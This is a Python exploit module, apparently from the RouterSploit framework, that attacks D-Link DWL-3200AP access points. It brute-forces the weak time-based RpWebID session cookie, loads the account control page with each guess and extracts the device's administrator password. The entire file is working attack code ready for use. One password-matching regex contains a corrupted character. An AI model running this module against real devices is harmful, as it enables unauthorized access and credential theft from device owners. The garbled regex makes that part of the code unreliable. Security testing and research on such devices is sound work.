# -*- coding:utf-8 -*-
import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    mute,
    http_request,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploits D-Link DWL-3200AP access points weak cookie value
    """
    __info__ = {
        'name': 'D-Link DWL-3200AP Password Disclosure',
        'description': 'Exploits D-Link DWL3200 access points weak cookie value',
        'authors': [
            'pws',  # Vulnerability discovery
            'Josh Abraham <sinisterpatrician[at]google.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/34206/',
        ],
        'devices': [
            'D-Link DWL-3200AP',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    # 3600 seconds - one hour means that we will bruteforce authenticated cookie value that was valid within last hour
    seconds = exploits.Option(3600, 'Number of seconds in the past to bruteforce')

    def run(self):
        if self.check():
            cookie_value = self.get_cookie()
            print_success("Cookie retrieved: {}".format(cookie_value))

            cookie_int = int(cookie_value, 16)
            start = cookie_int - int(self.seconds)

            print_status("Starting bruteforcing cookie value...")
            for i in xrange(cookie_int, start, -1):
                self.test_cookie(i)
        else:
            print_error("Target does not appear to be vulnerable")

    @mute
    def check(self):
        """
        Method that verifies if the target is vulnerable. It should not write anything on stdout and stderr.
        """
        if self.get_cookie() is not None:
            return True

        return False

    def get_cookie(self):
        """
        Method that retrieves current cookie from AP
        """
        url = "{}:{}".format(self.target, self.port)
        pattern = "RpWebID=([a-z0-9]{8})"
        print_status("Attempting to get cookie...")
        try:
            r = http_request(method='GET', url=url, timeout=3)
            tgt_cookie = re.search(pattern, r.text)
            if tgt_cookie is None:
                print_error("Unable to retrieve cookie")
            else:
                return tgt_cookie.group(1)
        except Exception:
            print_error("Unable to connect to target")

    def test_cookie(self, cookie_int):
        """
        Method that tests all cookies from the past to find one that is valid
        """
        url = "{}:{}/html/tUserAccountControl.htm".format(self.target, self.port)
        cookies = dict(RpWebID=str(cookie_int))
        try:
            r = http_request(method='GET', url=url, cookies=cookies, timeout=10)
            if ('NAME="OldPwd"' in r.text):
                print_success("Cookie {} is valid!".format(cookie_int))
                pattern = r"NAME=\"OldPwd\" SIZE=\"12\" MAXLENGTH=\"12\" VALUE=\"([�-9]+)\""
                password = re.findall(pattern, r.content)[0].replace('&', ';&')[1:] + ";"
                print_success("Target password is : {}".format(password))
        except Exception:
            print_error("Unable to connect to target")
